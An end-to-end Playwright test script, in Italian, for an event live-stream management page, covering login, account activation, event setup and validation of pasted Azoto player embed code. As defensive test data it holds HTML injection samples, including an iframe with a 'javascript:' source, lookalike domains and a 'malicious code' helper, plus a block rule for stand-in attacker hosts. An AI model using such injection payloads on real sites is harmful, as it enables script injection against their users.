        await context.route(/^https?:\/\/(?:[a-z0-9-]+\.)*(?:azotosolutions\.com|cattivo\.example|evil\.test)(?::\d+)?\//, route => {
            bloccate.push(route.request().url());
            return route.abort('blockedbyclient');
        });
        // la web TV di prova e il player di Azoto finto visti dal browser (registrati dopo preparaContesto: le loro regole vincono)
        const webtv = await WT.instradaWebTv(context, CARTELLA_WEBTV);
        const azoto = await WT.instradaAzoto(context);
        /* Le richieste verso il player di Azoto che passano DAVVERO da
           context.route (registrata per ultima: la vede per prima, conta e
           passa a instradaAzoto). Una richiesta del browser che non passasse
           di qui andrebbe in rete, verso l'Azoto vero. */
        let intercettateAzoto = 0;
        await context.route(/^https:\/\/cdn\.azotosolutions\.com\//, route => { intercettateAzoto++; return route.fallback(); });
        // «Copia il testo per la web TV» usa gli appunti del sistema
        await context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: SITO });
        await context.addInitScript(p => {
            window.NGB_DIRETTA_PROVE = p;
            /* Solo un cronometro: quando partono e quando tornano le chiamate
               della pagina al servizio, misurato DENTRO la pagina (serve alla
               pausa fra i gruppi di 'crea'; da fuori i tempi arrivano sfasati). */
            window.__tempiServizio = [];
            const fetchVero = window.fetch;
            window.fetch = function (indirizzo, opzioni) {
                const voce = { azione: '', inizio: performance.now(), fine: null };
                if (typeof indirizzo === 'string' && /\/api\/diretta-/.test(indirizzo)) {
                    try { voce.azione = JSON.parse((opzioni && opzioni.body) || '{}').azione || ''; } catch (_) { /* niente */ }
                    window.__tempiServizio.push(voce);
                }
                return fetchVero.apply(this, arguments).then(
                    r => { voce.fine = performance.now(); return r; },
                    e => { voce.fine = performance.now(); throw e; });
            };
            window.__violazioniCSP = [];
            document.addEventListener('securitypolicyviolation', e => {
                window.__violazioniCSP.push(e.violatedDirective + ' ' + e.blockedURI + ' ' + (e.sourceFile || ''));
            });
        }, { firestore: PORTE.firestore, auth: PORTE.auth, api: API });

        const page = await context.newPage();
        paginaAperta = page;
        page.on('pageerror', e => erroriPaginaAperta.push(e.stack || e.message));
        const erroriConsole = [];
        const erroriPagina = [];
        page.on('console', m => { if (m.type() === 'error') erroriConsole.push({ testo: m.text(), url: (m.location() && m.location().url) || '' }); });
        page.on('pageerror', e => erroriPagina.push(e.message));

        /* Il registro delle chiamate della pagina al servizio: si guarda, non
           si tocca (page.on). Le risposte di email-avanza servono a vedere
           come la pagina segue la coda. */
        const registro = [];
        const risposteAvanza = [];
        page.on('request', req => {
            if (req.method() !== 'POST' || !/\/api\/diretta-(gestione|accesso)$/.test(req.url())) return;
            let dati = {};
            try { dati = JSON.parse(req.postData() || '{}'); } catch (_) { dati = {}; }
            // grezzo: il corpo com'e' partito (per vedere che non porta HTML)
            registro.push({ azione: dati.azione, dati: dati, grezzo: req.postData() || '', quando: Date.now() });
        });
        page.on('requestfinished', async req => {
            if (req.method() !== 'POST' || !/\/api\/diretta-gestione$/.test(req.url())) return;
            let dati = {};
            try { dati = JSON.parse(req.postData() || '{}'); } catch (_) { return; }
            if (dati.azione === 'email-avanza') {
                const risposta = await req.response().catch(() => null);
                const j = risposta ? await risposta.json().catch(() => null) : null;
                risposteAvanza.push({ quando: Date.now(), dati: j });
            }
        });
        const chiamate = azione => registro.filter(c => c.azione === azione);
        /* Tutte le risposte del servizio alla pagina, per intero: servono a
           leggere quello che la pagina ha ricevuto (per esempio l'esito di
           prova-link) e a controllare che la chiave dei link firmati non
           torni MAI indietro. */
        const risposteServizio = [];
        page.on('response', async r => {
            if (!/\/api\/diretta-/.test(r.url()) || r.request().method() !== 'POST') return;
            let azione = '';
            try { azione = JSON.parse(r.request().postData() || '{}').azione || ''; } catch (_) { azione = ''; }
            const voce = { azione: azione, stato: r.status(), corpo: null };
            risposteServizio.push(voce);
            try { voce.corpo = await r.text(); } catch (_) { voce.corpo = ''; }
        });
        const risposte = azione => risposteServizio.filter(r => r.azione === azione && r.corpo !== null).map(r => { try { return JSON.parse(r.corpo); } catch (_) { return null; } });
        // le richieste della pagina al servizio ancora in viaggio (prima di riavviarlo)
        let inViaggio = 0;
        const eDelServizio = req => /\/api\/diretta-/.test(req.url()) && req.method() === 'POST';
        page.on('request', req => { if (eDelServizio(req)) inViaggio++; });
        page.on('requestfinished', req => { if (eDelServizio(req)) inViaggio--; });
        page.on('requestfailed', req => { if (eDelServizio(req)) inViaggio--; });

        /* L'unico guasto finto: la rete che cade durante 'crea'. */
        const creaRichieste = [];
        const guastoCrea = { restanti: 0, perse: 0 };
        await page.route(API + '/diretta-gestione', async route => {
            const req = route.request();
            let dati = {};
            try { dati = JSON.parse(req.postData() || '{}'); } catch (_) { dati = {}; }
            if (req.method() !== 'POST' || dati.azione !== 'crea') return route.continue();
            const n = creaRichieste.length;
            creaRichieste.push({ quando: Date.now(), righe: (dati.righe || []).length, emails: (dati.righe || []).map(r => r.email).join('|'), esito: 'passata' });
            if (n >= 1 && guastoCrea.restanti > 0) {
                guastoCrea.restanti--;
                if (guastoCrea.perse > 0) {
                    // arriva al servizio (che crea gli account), ma la risposta si perde
                    guastoCrea.perse--;
                    creaRichieste[n].esito = 'risposta persa';
                    await route.fetch().catch(() => null);
                    return route.abort('connectionreset');
                }
                creaRichieste[n].esito = 'non partita';
                return route.abort('internetdisconnected');
            }
            return route.continue();
        });

        await page.clock.install();

        const $ = s => page.locator(s);
        const testo = async s => (await $(s).textContent() || '').trim();
        const visibile = s => $(s).isVisible();
        const aspetta = async (fn, ms, descr) => {
            const fine = Date.now() + (ms || 10000);
            let ultimo;
            while (Date.now() < fine) {
                try { ultimo = await fn(); if (ultimo) return ultimo; } catch (e) { ultimo = e.message; }
                await pausa(100);
            }
            throw new Error('Tempo scaduto: ' + (descr || '') + ' (' + ultimo + ')');
        };
        /* Le foto a pagina intera non ricalcolano gli elementi "appiccicati"
           (la testata, il piede dell'anteprima) ne' quelli fissi (gli avvisi):
           li disegnerebbero a meta' pagina, sopra le righe. Solo per la foto
           si rimettono al loro posto nel flusso della pagina. */
        async function foto(nome, soloVista) {
            const stile = soloVista ? null : await page.addStyleTag({ content: '.testata,.anteprima-piede{position:static!important}.avvisi{display:none!important}' });
            await page.evaluate(() => window.scrollTo(0, 0));
            for (const [dispositivo, vista] of [['computer', { width: 1440, height: 900 }], ['tablet', { width: 820, height: 1180 }]]) {
                await page.setViewportSize(vista);
                await pausa(300);
                await page.screenshot({ path: path.join(FOTO, dispositivo + '-' + nome + '.png'), fullPage: !soloVista });
            }
            if (stile) await stile.evaluate(n => n.remove());
            await page.setViewportSize({ width: 1440, height: 900 });
            await pausa(150);
        }
        // la finestra di conferma: il titolo e il testo attesi (e, se dato, il pulsante), poi «OK»
        async function confermaDialogo(atteso, etichettaOk) {
            await $('#dialogo-conferma').waitFor({ state: 'visible', timeout: 30000 });
            const titolo = await testo('#conferma-titolo');
            const corpo = await testo('#conferma-testo') + ' ' + await testo('#conferma-dettagli');
            const ok = await testo('#conferma-ok');
            if (atteso) {
                vero(atteso.test(titolo + ' ' + corpo) && (!etichettaOk || ok === etichettaOk),
                    'conferma chiesta: «' + titolo + '»' + (etichettaOk ? ', pulsante «' + ok + '»' : ''), corpo + ' | ' + ok);
            }
            await $('#conferma-ok').click();
            await $('#dialogo-conferma').waitFor({ state: 'hidden', timeout: 5000 });
            return titolo + ' ' + corpo;
        }
        const calma = () => aspetta(async () => { if (inViaggio > 0) return false; await pausa(400); return inViaggio === 0; }, 20000, 'richieste in viaggio');
        const riga = n => $('#tabella-anteprima tr[data-riga="' + n + '"]');
        const classeRiga = async n => (await riga(n).getAttribute('class')) || '';
        const avvisi = async () => (await $('#avvisi').textContent()) || '';

        /* ---------- il video: attrezzi ----------
           I campi del player Azoto (ev-azoto, regia-azoto) dicono che cosa
           hanno riconosciuto in <id>-indirizzo (l'indirizzo che si salva);
           quelli del flusso diretto in <id>-tipo. */
        const rigaDi = id => '#' + id + (/-azoto$/.test(id) ? '-indirizzo' : '-tipo');
        // scrive un link (o il codice di Azoto) nel campo e lo fa riconoscere subito (come uscendo dal campo)
        async function scriviLink(id, valore) {
            await $('#' + id).fill(valore);
            await $('#' + id).dispatchEvent('change');
            return {
                tipo: await testo(rigaDi(id)),
                tono: await $(rigaDi(id)).getAttribute('data-tono'),
                // la riga sotto il campo e' solo testo: nessun tag del codice incollato
                tag: await $(rigaDi(id) + ' *:not(strong):not(span.testo-fisso)').count()
            };
        }
        /* «Prova il player» / «Prova il link» (con il testo scritto prima,
           se dato): aspetta la fine della prova e legge il riquadro
           dell'esito, la riga sotto il campo e la risposta del servizio. */
        async function provaLink(id, valore) {
            if (valore !== undefined) await $('#' + id).fill(valore);
            const prima = chiamate('prova-link').length;
            await $('#btn-prova-' + id).click();
            await aspetta(async () => await $('#btn-prova-' + id).getAttribute('aria-busy') !== 'true', 45000, 'prova del link ' + (valore || ''));
            const conEsito = await $('#' + id + '-esito').isVisible();
            let servizio = null;
            if (chiamate('prova-link').length > prima) {
                servizio = await aspetta(async () => {
                    const rr = risposteServizio.filter(x => x.azione === 'prova-link');
                    const ultima = rr[rr.length - 1];
                    return rr.length >= chiamate('prova-link').length && ultima.corpo !== null ? JSON.parse(ultima.corpo) : null;
                }, 5000, 'risposta di prova-link');
            }
            return {
                esito: conEsito ? await $('#' + id + '-esito').getAttribute('data-esito') : '',
                bollo: conEsito ? await testo('#' + id + '-esito .esito-bollo') : '',
                titolo: conEsito ? await testo('#' + id + '-esito .esito-titolo') : '',
                testo: conEsito ? await testo('#' + id + '-esito') : '',
                tipo: await testo(rigaDi(id)),
                chiamate: chiamate('prova-link').length - prima,
                // la richiesta com'e' partita verso il servizio (per il player Azoto: solo l'indirizzo)
                richiesta: chiamate('prova-link').length > prima ? chiamate('prova-link').slice(-1)[0] : null,
                servizio: servizio
            };
        }
        // la finestra di conferma: il titolo e il testo attesi, poi «Annulla» (niente deve cambiare)
        async function annullaDialogo(atteso) {
            await $('#dialogo-conferma').waitFor({ state: 'visible', timeout: 30000 });
            const titolo = await testo('#conferma-titolo');
            const corpo = await testo('#conferma-testo') + ' ' + await testo('#conferma-dettagli');
            vero(atteso.test(titolo + ' ' + corpo), 'conferma chiesta: «' + titolo + '» (qui si annulla)', corpo);
            await $('#conferma-annulla').click();
            await $('#dialogo-conferma').waitFor({ state: 'hidden', timeout: 5000 });
            return titolo + ' ' + corpo;
        }
        /* L'anteprima del player Azoto sotto un campo: l'iframe che ha
           costruito player-azoto.js, i suoi attributi e la pagina (finta)
           del player caricata dentro. */
        async function anteprimaAzoto(box) {
            const iframe = await page.evaluate(sel => Array.from(document.querySelectorAll(sel + ' iframe')).map(f => {
                // in vista, sotto la testata che resta in cima (fuori dalla finestra elementFromPoint non vede niente)
                f.scrollIntoView({ block: 'center' });
                const b = f.getBoundingClientRect();
                const centro = document.elementFromPoint(b.left + b.width / 2, b.top + b.height / 2);
                return {
                    classe: f.className, src: f.getAttribute('src'), allow: f.getAttribute('allow'), schermoIntero: f.hasAttribute('allowfullscreen'),
                    referrer: f.getAttribute('referrerpolicy'), scrolling: f.getAttribute('scrolling'), titolo: f.getAttribute('title'),
                    // gli attributi del codice incollato non devono esserci
                    estranei: f.getAttributeNames().filter(a => /^on|srcdoc|sandbox|frameborder/.test(a)),
                    largo: Math.round(b.width), alto: Math.round(b.height),
                    // al centro dell'iframe c'e' l'iframe: niente di nostro sopra i comandi di Azoto
                    libero: centro === f
                };
            }), box);
            return iframe;
        }
        // la pagina del player (finto) di Azoto dentro l'iframe dell'anteprima, con il suo canale
        async function paginaAzotoIn(box, canale) {
            return aspetta(async () => {
                const h = await page.$(box + ' iframe.player-azoto');
                const f = h && await h.contentFrame();
                if (!f) return null;
                const nome = await f.textContent('#canale-azoto', { timeout: 500 }).catch(() => '');
                return String(nome || '').trim() === canale ? f : null;
            }, 10000, 'pagina del player ' + canale + ' nell\'iframe').catch(() => null);
        }
        // il video di un'anteprima va davvero: pronto, con l'immagine, e il tempo avanza
        async function videoVa(sel) {
            const leggi = () => page.evaluate(s => {
                const v = document.querySelector(s + ' video');
                return v ? { t: v.currentTime, pronto: v.readyState, larghezza: v.videoWidth } : null;
            }, sel);
            return aspetta(async () => {
                const a = await leggi();
                await pausa(700);
                const b = await leggi();
                return !!(a && b && b.t > a.t && b.pronto >= 2 && b.larghezza > 0);
            }, 20000, 'video che va in ' + sel).catch(() => false);
        }
        /* Le foto del video (risultati/screenshot-gestione-azoto/):
           quello che vede il gestore sullo schermo, al computer (1440x900)
           e al telefono (390x844), con il pezzo che interessa appena sotto
           la testata (che resta in cima scorrendo). seguitoTelefono: sul
           telefono una seconda foto, piu' in basso (-telefono-2.png). */
        async function fotoVideo(nome, selettore, seguitoTelefono) {
            // gli avvisi brevi di prima (in basso a destra) spariscono da soli in 6 secondi: si aspetta che se ne vadano
            await aspetta(async () => (await $('#avvisi .avviso').count()) === 0, 12000, 'avvisi spariti').catch(() => {});
            const scorri = sel => page.evaluate(q => {
                const n = document.querySelector(q);
                const t = document.querySelector('.testata');
                const alto = t ? t.getBoundingClientRect().height : 0;
                window.scrollTo(0, Math.max(0, n.getBoundingClientRect().top + window.scrollY - alto - 16));
            }, sel);
            for (const [dispositivo, vista] of [['computer', { width: 1440, height: 900 }], ['telefono', { width: 390, height: 844 }]]) {
                await page.setViewportSize(vista);
                await pausa(400);
                await scorri(selettore);
                await pausa(400);
                await page.screenshot({ path: path.join(FOTO_AZOTO, nome + '-' + dispositivo + '.png') });
                if (dispositivo === 'telefono' && seguitoTelefono) {
                    await scorri(seguitoTelefono);
                    await pausa(300);
                    await page.screenshot({ path: path.join(FOTO_AZOTO, nome + '-telefono-2.png') });
                }
            }
            await page.setViewportSize({ width: 1440, height: 900 });
            await pausa(200);
        }

        /* ---------- 1. accesso e attivazione del gestore ---------- */
        console.log('\n-- accesso del gestore');
        await page.goto(SITO + '/diretta/gestione/?emulatori=1');
        await $('#form-gestore').waitFor({ state: 'visible', timeout: 30000 });
        vero(await page.evaluate(() => !!document.querySelector('meta[http-equiv="Content-Security-Policy"]')), 'la pagina ha la Content-Security-Policy');
        await foto('accesso', true);
        await $('#gestore-email').fill(EMAIL_GESTORE);
        await $('#gestore-password').fill('sbagliata-123');
        await $('#btn-gestore-entra').click();
        await aspetta(async () => /non corretti/.test(await testo('#msg-gestore')), 10000, 'messaggio password sbagliata');
        vero(true, 'password sbagliata: «' + await testo('#msg-gestore') + '»');

        await $('#gestore-email').fill(EMAIL_CURIOSO);
        await $('#gestore-password').fill(PASSWORD_CURIOSO);
        await $('#btn-gestore-entra').click();
        await aspetta(async () => /non è tra i gestori/.test(await testo('#msg-gestore')) && await visibile('#form-gestore'), 15000, 'rifiuto del non gestore');
        vero(true, 'un account che non è in elenco viene respinto dal servizio e scollegato: «' + await testo('#msg-gestore') + '»');

        // l'email e' in elenco, ma l'account l'aveva creato qualcun altro (con la chiave pubblica si puo')
        await $('#gestore-email').fill(EMAIL_GESTORE);
        await $('#gestore-password').fill(PASSWORD_ABUSIVA);
        await $('#btn-gestore-entra').click();
        await aspetta(async () => /Primo accesso o password dimenticata/.test(await testo('#msg-gestore')) && await visibile('#form-gestore'), 15000, 'gestore non attivato');
        vero(true, 'email in elenco ma account non attivato: il servizio lo rifiuta e indica la strada: «' + await testo('#msg-gestore') + '»');

        await $('#gestore-password').fill('');
        await $('#link-gestore-reset').click();
        await aspetta(async () => /tra i gestori/.test(await testo('#msg-gestore')), 15000, 'primo accesso');
        const ga = chiamate('gestore-accesso');
        vero(ga.length === 1 && ga[0].dati.email === EMAIL_GESTORE, '«Primo accesso o password dimenticata» chiama diretta-accesso {azione: gestore-accesso} con l\'email scritta');
        const lettera = postaPer(EMAIL_GESTORE, 'reimpostazione').pop();
        const link = lettera && /https?:\/\/\S+?reimposta\.html\?oobCode=[^\s"<]+/.exec(lettera.testo + ' ' + lettera.html);
        vero(!!link && link[0].startsWith(SITO + '/diretta/reimposta.html?oobCode=') && /[?&]per=gestione\b/.test(link[0]),
            'nella casella del gestore arriva il collegamento per la password (reimposta.html?…&per=gestione)', link && link[0]);
        vero(!(await tokenDi(EMAIL_GESTORE, PASSWORD_ABUSIVA)), 'chi si era registrato da solo con quell\'email perde l\'accesso: la sua password non vale più (D2)');
        const oob = new URL(link[0].replace(/&amp;/g, '&')).searchParams.get('oobCode');
        const reset = await postJSON(AUTH_REST + '/accounts:resetPassword?key=finta', { oobCode: oob, newPassword: PASSWORD_GESTORE });
        vero(reset.stato === 200, 'il collegamento funziona: la nuova password del gestore è impostata (come fa reimposta.html)', JSON.stringify(reset.dati));
        const utenteGestore = await auth.getUserByEmail(EMAIL_GESTORE);
        vero(utenteGestore.customClaims && utenteGestore.customClaims.gestore === true && utenteGestore.emailVerified === true,
            'l\'account di gestione ora ha il claim «gestore» e l\'email verificata (messi solo dal servizio)');

        // un evento passato, preparato con il servizio vero dal "gestore" stesso
        const tokGestore = await tokenDi(EMAIL_GESTORE, PASSWORD_GESTORE);
        const s1 = await api('diretta-gestione', { azione: 'evento-salva', evento: { id: 'roma-2026', nuovo: true, titolo: 'Next Generation Business 2026 · Roma', luogo: 'Roma', data: '2026-04-17', oraInizio: '09:00', oraFine: '17:00', videoUrl: '', programma: [], paginaEvento: '/roma_aprile_2026/' } }, tokGestore);
        const s2 = await api('diretta-gestione', { azione: 'crea', idEvento: 'roma-2026', righe: [
            { riga: 2, nome: 'Mario', cognome: 'Rossi', email: 'mario.rossi@altra-azienda.example', azienda: 'Altra Azienda S.p.A.' },
            { riga: 3, nome: 'Giulia', cognome: 'Ferri', email: 'giulia.ferri@ferri-consulting.example', azienda: 'Ferri Consulting' }
        ] }, tokGestore);
        const s3 = await api('diretta-gestione', { azione: 'evento-stato', idEvento: 'roma-2026', stato: 'terminato' }, tokGestore);
        vero(s1.stato === 200 && s2.stato === 200 && s3.stato === 200 && s2.dati.risultati.every(x => x.esito === 'creato'),
            'preparato con il servizio l\'evento passato di Roma, con Mario Rossi e Giulia Ferri', JSON.stringify([s1.dati, s2.dati, s3.dati]).slice(0, 400));

        await $('#gestore-password').fill(PASSWORD_GESTORE);
        await $('#btn-gestore-entra').click();
        await $('#vista-app').waitFor({ state: 'visible', timeout: 20000 });
        vero(await testo('#gestore-connesso') === EMAIL_GESTORE, 'gestore collegato con la password scelta dal collegamento: la testata mostra la sua email');
        await aspetta(async () => await $('#sel-evento').inputValue() === 'roma-2026', 10000, 'elenco degli eventi');
        vero(await page.locator('#sel-evento option[value="roma-2026"]').count() === 1 && /Dati dell'evento/.test(await testo('#titolo-form-evento')),
            'l\'elenco degli eventi arriva dal servizio (azione eventi) e si apre l\'ultimo evento');

        /* ---------- 2. evento di Napoli: il tipo di player, il player Azoto e il flusso diretto ---------- */
        console.log('\n-- creazione dell\'evento di Napoli');
        await $('#btn-nuovo-evento').click();
        vero(await $('#tab-partecipanti').isDisabled(), 'con un evento nuovo non ancora salvato le altre schede sono spente');
        await $('#ev-titolo').fill('Next Generation Business 2026 · Napoli');
        await $('#ev-luogo').fill('Napoli · Hotel Eurostars Excelsior');
        await $('#ev-data').fill('2026-10-02');
        vero(await $('#ev-id').inputValue() === ID, 'identificativo proposto dal luogo e dall\'anno: ' + await $('#ev-id').inputValue());
        await $('#ev-programma').fill('09.00 Accoglienza e registrazione\n09.30 Saluti istituzionali\n10:00 - Adeguati assetti e governance\n13.00 Pausa pranzo\n17.30 Chiusura dei lavori');
        await $('#ev-pagina').fill('napoli_ottobre_2026');
        await $('#ev-promemoria-giorno').check();

        console.log('\n-- «Tipo di player»: il player Azoto è il predefinito');
        const radioAzoto = $('input[name="ev-tipo-player"][value="azoto"]');
        const radioFlusso = $('input[name="ev-tipo-player"][value="flusso"]');
        const flussoSpento = async () => await radioFlusso.isDisabled()
            && /\bspenta\b/.test(await $('#ev-tipo-player .opzione:has(input[value="flusso"])').getAttribute('class') || '');
        const testoTipoPlayer = (await testo('#ev-tipo-player')).replace(/\s+/g, ' ');
        vero(await testo('#ev-tipo-player legend') === 'Tipo di player' && /Player Azoto \(iframe\) predefinito/.test(testoTipoPlayer) && /Flusso diretto \(\.m3u8\)/.test(testoTipoPlayer),
            'la scheda Evento ha il campo «Tipo di player»: «Player Azoto (iframe)» (predefinito) e «Flusso diretto (.m3u8)»', testoTipoPlayer);
        vero(await radioAzoto.isChecked() && !(await radioFlusso.isChecked()), 'per un evento nuovo è scelto «Player Azoto (iframe)»');
        vero(await flussoSpento() && /^Si può scegliere quando c'è il link \.m3u8 del flusso/.test(await testo('#ev-tipo-flusso-nota')),
            '«Flusso diretto (.m3u8)» non si può scegliere senza il link del flusso, e lo dice: «' + await testo('#ev-tipo-flusso-nota') + '»');
        vero(await testo('#blocco-azoto .blocco-uso') === 'scelto' && await testo('#blocco-flusso .blocco-uso') === 'non in uso',
            'i due riquadri dicono quale si userà: «Player Azoto» scelto, «Flusso diretto (.m3u8)» non in uso');

        console.log('\n-- il player Azoto: dal codice vero si prende solo l\'indirizzo, e lo si vede subito');
        let r = await scriviLink('ev-azoto', CODICE_AZOTO);
        vero(r.tono === 'ok' && r.tag === 0
            && r.tipo === 'Indirizzo del player: ' + AZOTO_29 + ' Preso dal codice di Azoto: si salva solo questo indirizzo, il resto del codice si scarta. Premi «Prova il player» per controllarlo.',
            'incollato il codice di Azoto (div, iframe con le virgolette singole, script), sotto il campo compare subito l\'indirizzo che si salva, come testo: «' + r.tipo + '»', JSON.stringify(r));
        vero(await testo('#blocco-azoto .nota-azoto') === V.AVVISO_INCORPORATO && await $('#blocco-azoto .nota-azoto').isVisible(), 'sotto il campo, la nota fissa sui comandi di Azoto');
        vero(await page.evaluate(() => document.querySelectorAll('.azoto-player-container, iframe, script[src*="azoto-player"]').length) === 0,
            'nella pagina non è entrato niente del codice incollato: nessun .azoto-player-container, nessun iframe, nessuno script di Azoto');
        // gli indirizzi che non si accettano: il messaggio di sorgente-video.js, subito, senza chiamare nessuno
        const rifiutatiAzoto = [
            ['https://player.altrosito.example/embed/1', 'non-azoto', 'la pagina di un altro sito'],
            ['https://azotosolutions.com/cloudtv/livetv91/player', 'non-azoto', 'azotosolutions.com senza «cdn.»'],
            ['https://cdn.azotosolutions.com.evil.test/cloudtv/livetv91/player', 'non-azoto', 'un sottodominio finto (cdn.azotosolutions.com.evil.test)'],
            ['https://cdn.azotosolutions.com:8443/cloudtv/livetv91/player', 'non-azoto', 'la porta 8443'],
            ['http://cdn.azotosolutions.com/cloudtv/livetv91/player', 'https', 'http://'],
            ['<iframe src="javascript:parent.__attacco=\'js\'"></iframe>' + CODICE_AZOTO, 'formato', 'un iframe javascript: prima di quello di Azoto'],
            ['<iframe src="https://cattivo.example/player"></iframe>' + CODICE_AZOTO, 'non-azoto', 'il primo iframe di un altro sito (quello di Azoto dopo)'],
            ['<iframe width="640" height="360" allowfullscreen></iframe>', 'codice', 'un codice senza l\'indirizzo del player'],
            [LINK.live, 'e-flusso', 'il link .m3u8 del flusso diretto (va nell\'altro campo)']
        ];
        for (const [valore, codice, nome] of rifiutatiAzoto) {
            r = await scriviLink('ev-azoto', valore);
            vero(r.tono === 'errore' && r.tipo === MSG(codice) && r.tag === 0, 'nel campo del player Azoto ' + nome + ': rifiutato subito, «' + r.tipo + '»', JSON.stringify(r));
        }
        const provaRifiutata = await provaLink('ev-azoto', 'https://cdn.azotosolutions.com.evil.test/cloudtv/livetv91/player');
        vero(provaRifiutata.chiamate === 0 && !provaRifiutata.esito && provaRifiutata.tipo === MSG('non-azoto') && await $('#ev-azoto').getAttribute('aria-invalid') === 'true'
            && !(await $('#ev-azoto-anteprima').isVisible()),
            '«Prova il player» con un indirizzo non consentito: il motivo sotto il campo, senza chiamare il servizio e senza anteprima');

        console.log('\n-- il flusso diretto: che cosa riconosce la gestione mentre lo si scrive');
        r = await scriviLink('ev-video', LINK.live);
        vero(r.tono === 'ok' && r.tipo.includes(V.descrizione('hls')) && /Premi «Prova il link»/.test(r.tipo), 'link .m3u8: «' + r.tipo + '» (flusso HLS, il nostro player)');
        vero(!(await radioFlusso.isDisabled()) && /^Il link del flusso è pronto/.test(await testo('#ev-tipo-flusso-nota')),
            'con un link .m3u8 valido «Flusso diretto (.m3u8)» si può scegliere: «' + await testo('#ev-tipo-flusso-nota') + '»');
        r = await scriviLink('ev-video', LINK.dash);
        vero(r.tono === 'ok' && r.tipo.includes('Flusso DASH (.mpd): lo riproduce il nostro player.'), 'link .mpd: «' + r.tipo + '»');
        const rifiutatiFlusso = [
            ['http://webtv.prova.test/live/master.m3u8', /https:\/\//, 'http://'],
            ['rtmp://webtv.prova.test/live/chiave-di-trasmissione', /per trasmettere \(RTMP\/RTSP\/SRT\), non per guardare/, 'rtmp://'],
            [WEBTV + '/registrazioni/napoli.mp4', /file video.*non una diretta/, 'un file .mp4'],
            ['la diretta di Napoli sul canale 5', /Non riconosco un link valido/, 'un testo che non è un link'],
            [LINK.pagina, MSG('non-flusso'), 'la pagina di un player (non un flusso)'],
            [LINK.pdf, MSG('non-flusso'), 'un PDF'],
            [AZOTO_29, MSG('e-azoto'), 'l\'indirizzo del player Azoto (va nell\'altro campo)'],
            [CODICE_AZOTO, MSG('e-azoto'), 'il codice di Azoto (va nell\'altro campo)']
        ];
        const combacia = (atteso, t) => (atteso instanceof RegExp ? atteso.test(t) : t === atteso);
        for (const [link, atteso, nome] of rifiutatiFlusso) {
            r = await scriviLink('ev-video', link);
            const esitoProva = await provaLink('ev-video');
            vero(r.tono === 'errore' && combacia(atteso, r.tipo) && esitoProva.chiamate === 0 && !esitoProva.esito
                && await $('#ev-video').getAttribute('aria-invalid') === 'true' && combacia(atteso, esitoProva.tipo) && await flussoSpento(),
                'nel campo del flusso ' + nome + ': rifiutato subito, con il motivo e senza chiamare il servizio («Flusso diretto» resta spento) — «' + r.tipo + '»', JSON.stringify([r, esitoProva]));
        }
        // «Flusso diretto» scelto e poi il link tolto: non si salva (il servizio lo rifiuterebbe)
        await scriviLink('ev-video', LINK.live);
        await radioFlusso.check();
        await $('#ev-video').fill('');
        await $('#ev-video').dispatchEvent('change');
        vero(await radioFlusso.isChecked() && !(await radioFlusso.isDisabled()) && await $('#ev-tipo-flusso-nota').getAttribute('data-tono') === 'errore'
            && /^Manca un link \.m3u8 valido/.test(await testo('#ev-tipo-flusso-nota')) && await testo('#blocco-flusso .blocco-uso') === 'scelto',
            '«Flusso diretto» scelto e poi il link tolto: la scelta resta, ma la nota lo dice in rosso: «' + await testo('#ev-tipo-flusso-nota') + '»');
        await $('#btn-salva-evento').click();
        vero(/Tipo di player: per il flusso diretto serve prima il link \.m3u8/.test(await testo('#msg-evento')) && await radioFlusso.getAttribute('aria-invalid') === 'true'
            && chiamate('evento-salva').length === 0,
            'e al salvataggio si ferma qui, senza chiamare il servizio: «Tipo di player: per il flusso diretto serve prima il link .m3u8…»');
        await radioAzoto.check();
        vero(await flussoSpento() && !(await radioFlusso.getAttribute('aria-invalid')), 'di nuovo «Player Azoto»: «Flusso diretto» torna spento (il link non c\'è)');
        vero(chiamate('prova-link').length === 0 && webtv.richieste.length === 0 && azoto.richieste.length === 0,
            'fin qui nessuna chiamata al servizio e nessuna richiesta alla web TV o ad Azoto: il riconoscimento è tutto nella pagina (sorgente-video.js)');

        console.log('\n-- «Prova il player»: il codice malevolo e i guasti del player di Azoto');
        const provaMalevolo = await provaLink('ev-azoto', codiceMalevolo(AZOTO_29));
        const iframeMalevolo = await anteprimaAzoto('#ev-azoto-anteprima');
        vero(provaMalevolo.chiamate === 1 && provaMalevolo.richiesta.dati.link === AZOTO_29 && !/[<>]/.test(provaMalevolo.richiesta.grezzo),
            'il codice malevolo incollato: alla prova del servizio parte SOLO l\'indirizzo del primo iframe (' + AZOTO_29 + '), nessun pezzo di HTML', provaMalevolo.richiesta && provaMalevolo.richiesta.grezzo);
        vero(provaMalevolo.esito === 'ok' && iframeMalevolo.length === 1 && iframeMalevolo[0].classe === 'player-azoto' && iframeMalevolo[0].src === AZOTO_29 && iframeMalevolo[0].estranei.length === 0,
            'l\'anteprima ha UN iframe, costruito dal nostro codice con il solo indirizzo di Azoto: niente srcdoc, onload, onerror né il secondo iframe', JSON.stringify(iframeMalevolo));
        await pausa(500);
        vero(await page.evaluate(() => typeof window.__attacco) === 'undefined', 'nessuno script del codice incollato è stato eseguito: window.__attacco è ancora undefined');
        vero(!tutteLeRichieste.some(u => RE_RICHIESTE_VIETATE.test(u)) && bloccate.length === 0,
            'e nessuna richiesta verso i siti del codice (cattivo.example, lo script azoto-player.js di azotosolutions.com, l\'immagine «x»)', tutteLeRichieste.filter(u => RE_RICHIESTE_VIETATE.test(u)).join(' '));
        let p = await provaLink('ev-azoto', AZOTO_BLOCCATO);
        vero(p.chiamate === 1 && p.esito === 'errore' && p.bollo === 'Non si può usare' && p.titolo === 'Il player Azoto non si può incorporare'
            && /il loro server lo vieta \(X-Frame-Options: DENY\)/.test(p.testo) && !(await $('#ev-azoto-anteprima').isVisible()) && await $('#ev-azoto').getAttribute('aria-invalid') === 'true',
            'il player che il server di Azoto vieta di incorporare (X-Frame-Options: DENY): «Non si può usare», con il motivo, e nessuna anteprima — «' + p.titolo + '»', p.testo);
        p = await provaLink('ev-azoto', AZOTO_ALTROVE);
        vero(p.esito === 'errore' && p.bollo === 'Non si può usare' && p.titolo === 'Il player Azoto rimanda a un altro sito' && /rimanda a un altro sito \(webtv\.prova\.test\)/.test(p.testo)
            && !(await $('#ev-azoto-anteprima').isVisible()),
            'il player che rimanda a un altro sito: «Non si può usare» (dentro la nostra pagina il browser lo bloccherebbe) — «' + p.titolo + '»', p.testo);
        vero(!azoto.richieste.some(q => /^\/cloudtv\/(bloccato|altrove)\//.test(q)), 'quei due player il browser non li ha nemmeno aperti');
        const inizioLento = Date.now();
